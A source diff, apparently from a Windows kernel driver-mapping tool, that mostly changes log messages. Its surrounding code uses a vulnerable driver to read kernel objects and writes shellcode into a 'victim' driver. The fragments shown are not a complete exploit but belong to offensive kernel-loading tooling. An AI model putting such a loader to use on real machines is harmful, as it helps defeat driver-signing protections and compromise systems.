@@ -6,7 +6,7 @@
 *
 *  VERSION:     1.01
 *
-*  DATE:        01 Mar 2020
+*  DATE:        20 Apr 2020
 *
 *  Driver mapping routines.
 *
@@ -464,7 +464,7 @@ HANDLE StartVulnerableDriver(
         if (!NT_SUCCESS(ntStatus))
             printf_s("[!] Unable to open vulnerable driver, NTSTATUS (0x%lX)\r\n", ntStatus);
         else
-            printf_s("LDR: Vulnerable driver opened\r\n");
+            printf_s("LDR: Vulnerable driver opened, handle 0x%p\r\n", deviceHandle);
     }
 
     printf_s("[<] Leaving %s\r\n", __FUNCTION__);
@@ -852,8 +852,6 @@ Reload:
 
             RtlSecureZeroMemory(&fileObject, sizeof(fileObject));
 
-            printf_s("LDR: Reading FILE_OBJECT at 0x%llX\r\n", objectAddress);
-
             if (!ReadKernelVM(providerHandle,
                 objectAddress,
                 &fileObject,
@@ -862,8 +860,9 @@ Reload:
                 printf_s("[!] Could not read FILE_OBJECT at 0x%llX (Error %lu)\r\n", objectAddress, GetLastError());
                 break;
             }
-
-            printf_s("LDR: Reading DEVICE_OBJECT at 0x%p\r\n", fileObject.DeviceObject);
+            else {
+                printf_s("LDR: Reading FILE_OBJECT at 0x%llX - OK\r\n", objectAddress);
+            }           
 
             RtlSecureZeroMemory(&deviceObject, sizeof(deviceObject));
 
@@ -875,9 +874,10 @@ Reload:
                 printf_s("[!] Could not read DEVICE_OBJECT at 0x%p (Error %lu)\r\n", fileObject.DeviceObject, GetLastError());
                 break;
             }
-
-            printf_s("LDR: Reading DRIVER_OBJECT at 0x%p\r\n", deviceObject.DriverObject);
-
+            else {
+                printf_s("LDR: Reading DEVICE_OBJECT at 0x%p - OK\r\n", fileObject.DeviceObject);
+            }
+            
             if (!ReadKernelVM(providerHandle,
                 (ULONG_PTR)deviceObject.DriverObject,
                 &driverObject,
@@ -885,6 +885,9 @@ Reload:
             {
                 printf_s("[!] Could not read DRIVER_OBJECT at 0x%p (Error %lu)\r\n", deviceObject.DriverObject, GetLastError());
                 break;
+            }
+            else {
+                printf_s("LDR: Reading DRIVER_OBJECT at 0x%p - OK\r\n", deviceObject.DriverObject);
             }
 
             hdrDriver = VirtualAlloc(NULL, PAGE_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
@@ -900,6 +903,9 @@ Reload:
             {
                 printf_s("[!] Could not read driver image header at 0x%p (Error %lu)\r\n", driverObject.DriverStart, GetLastError());
                 break;
+            }
+            else {
+                printf_s("LDR: Victim driver image header at 0x%p read - OK\r\n", driverObject.DriverStart);
             }
 
             pehdr = (PIMAGE_NT_HEADERS64)((ULONG_PTR)hdrDriver + hdrDriver->e_lfanew);
@@ -1009,7 +1015,7 @@ Reload:
                 }
                 else
                 {
-                    printf_s("[!] Error writing shell code to the target driver, abort\r\n");
+                    printf_s("[!] Error writing shell code to the target driver, (Error %lu)\r\n", GetLastError());
                 }
             }
             else {
